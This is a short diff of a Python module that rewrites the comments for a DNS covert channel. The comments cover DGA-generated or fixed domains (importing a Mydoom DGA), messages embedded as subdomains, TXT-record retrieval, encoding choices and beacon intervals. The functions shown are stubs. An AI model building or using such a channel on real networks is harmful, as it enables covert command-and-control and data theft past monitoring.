@@ -8,23 +8,25 @@ import time
 import dns.resolver
 from dga import mydoom
 
-# communication.py
-# <Fucntions>
-##  - can check the number of the response packet
-##  - can select both and Specific domain DGA domain
-##  - can select the type of decode
-##  - can define the interval
-##  - can embed the message or predifine characters as beacon frame into subdomain
+# DOC:
+# <Fucntion of ability>
+##  - confirm the number of required request packets -> special subdomain 'mail'
+##  - select both generated domain(DGA) and specific domain
+##  - select the type of decode from [base32, base64, base85]
+##  - specify the time of interval
+##  - embed the message as subdomain
 # <Scenario>
 ## 1. decide the target hostname
-##   - dga or specific domain
-## 2. check the size of message in teh TXT record
-## 3. request the TXT record
+##   > choose dga or specific domain
+## 2. confirm the number of required request packets
+##   * your auth server calculates the number of it based on the size of message
+## 3. request the TXT record -> with www
 # <Mapping of subdomain>
-## - 'mail' : the size of RR
-## - 'www'  : the required packet numbers
+## - 'mail' : calculate the number of required packets
+##   * your auth server embeds the size and the number of packet in TXT RR
+## - 'www'  : request the message in TXT RR
 
-def search_response(msg:str) ->str:
+def dga():
     pass
 
 def exfiltrate(msg:str, length:int=10) ->list:
